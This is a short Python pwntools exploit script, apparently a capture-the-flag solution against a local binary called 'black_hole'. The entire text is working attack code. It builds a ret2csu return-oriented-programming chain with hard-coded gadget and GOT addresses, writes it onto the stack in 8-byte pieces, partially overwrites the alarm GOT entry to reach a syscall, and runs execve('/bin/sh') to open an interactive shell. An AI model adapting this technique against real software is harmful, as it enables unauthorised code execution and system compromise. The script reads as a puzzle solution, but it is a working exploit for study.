from pwn import *
from time import sleep
import sys
gadget_1=p64(0x00000000004007A6)
gadget_2=p64(0x0000000000400790)
 
addr_got_read=0x0000000000601028
addr_bss=0x000000000601058
addr_got_alarm=0x0000000000601020
 
#read first time
payload =gadget_1
payload+=p64(0)
payload+=p64(0)#rbx
payload+=p64(1)#rbp
payload+=p64(addr_got_read)#r12
payload+=p64(1)#r13rdx read num
payload+=p64(addr_got_alarm)#r14rsireadgot
payload+=p64(0x0)#r15edi read 0
payload+=gadget_2

#read second time
payload+=p64(0)
payload+=p64(0)#rbx
payload+=p64(1)#rbp
payload+=p64(addr_got_read)#r12
payload+=p64(0x3B)
payload+=p64(addr_bss)#r14rsireadbss
payload+=p64(0x0)
payload+=gadget_2

#call execve('/bin/sh') eax 3b ebx /bin/sh ecx=edx=0 syscall 
payload+=p64(0)
payload+=p64(0)#rbx
payload+=p64(1)#rbp
payload+=p64(addr_bss+8)#r12
payload+=p64(0)
payload+=p64(0)
payload+=p64(addr_bss)
payload+=gadget_2
 
def write_stack(content, sec = 0.5):
    p.sendline("2333")
    sleep(sec)
    p.send(content.rjust(0x18, "a") + p64(main))
    sleep(sec)
 
sec = 0.2
 
main = 0x0000000000400704
log.info("write stack...")
for off in range(0xe5, 0xe6):

    p = process('./black_hole')
    for i in xrange(len(payload), 0, -8):
        print i
        write_stack(payload[i-8:i], sec)
 
    p.sendline("2333")
    sleep(sec)
    p.send("a"*0x18 + p64(0x00000000004006CB))
    sleep(sec)
    log.info("try %s..." % hex(off))
    p.send(chr(off))  # over write one byte
    sleep(sec)
    pause() 
    payload2 = "/bin/sh\x00"
    payload2 += p64(0x0000000000400540)
    payload2 += (0x3B - len(payload2) - 1) * "a"
    p.sendline(payload2)
    try:
        p.interactive()
    except:
        p.close()

